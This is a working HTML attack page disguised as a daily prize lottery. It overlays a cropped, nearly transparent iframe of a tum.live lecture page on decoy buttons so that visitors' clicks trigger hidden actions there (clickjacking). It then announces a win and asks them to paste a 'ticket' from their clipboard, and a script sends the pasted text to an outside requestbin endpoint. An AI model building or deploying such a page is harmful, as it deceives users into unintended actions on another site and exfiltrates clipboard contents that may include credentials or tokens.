<!DOCTYPE html>
<html>
<head>
  <title>Do you win todays prize?</title>
  <style>
    iframe {
      position: absolute;
      top: 100px;
      left: 100px;
      width: 200px;
      height: 50px;
      opacity: 0.01; /* important: not fully 0 */
      z-index: 2;
      border: none;
    }


    #fake-button {
      position: absolute;
      top: 112px;
      left: 129px;
      width: 50px;
      height: 50px;
      z-index: 1;
    }
	#fake-button2 {
      position: absolute;
      top: 200px;
      left: 129px;
      width: 50px;
      height: 50px;
      z-index: 1;
    }

  .iframe-wrapper {
    width: 100px;   /* Visible frame size */
    height: 80px;
    overflow: hidden;
    position: relative;
	top: 20px;
	left: 100px;
  }

  .iframe-inner {
    position: absolute;
    top: -1225px;    /* Move the iframe content up */
    left: -1565px;   /* Move the iframe content left */
    width: 900px;  /* Must be larger than wrapper to crop from inside */
    height: 800px;
	transform: scale(2); /* Zoom in 2x */
    transform-origin: top left;
    border: none;
  }
  #output {
      margin-top: 200px;
      font-weight: bold;
      color: green;
    }

    #lotteryInput {
      display: none;
      margin-top: 10px;
    }




  </style>
</head>
<body>
  <h2>üéÅ Take a chance and check if you won today!</h2>
  <button id="fake-button">Chance</button>
  <button id="fake-button2">Check</button>

  <!-- Real action hidden in iframe -->
	<div class="iframe-wrapper">
	  <iframe class="iframe-inner" src="https://tum.live/w/SoSe25Ecg/57942"></iframe>
	</div>


	<div id="output"></div>
  <input id="lotteryInput" type="text" placeholder="Paste your ticket here..." />

  <script>
    const btn = document.getElementById("fake-button2");
    const output = document.getElementById("output");
    const lotteryInput = document.getElementById("lotteryInput");

    btn.addEventListener("click", () => {
      output.textContent = "üéâ You won! Your winning lottery ticket is in your clipboard.";
      lotteryInput.style.display = "block";
      lotteryInput.focus();
    });

	lotteryInput.addEventListener("paste", (e) => {
	  e.preventDefault();
	  const pasted = (e.clipboardData || window.clipboardData).getData('text');

	  // Send to server
	  fetch("https://requestbin.kanbanbox.com/158ymww1", {
		method: "POST",
			headers: {
			  "Content-Type": "application/x-www-form-urlencoded"
			},
			body: pasted.toString()
		  });

	  lotteryInput.value = "";
	});
  </script>
</body>

</html>
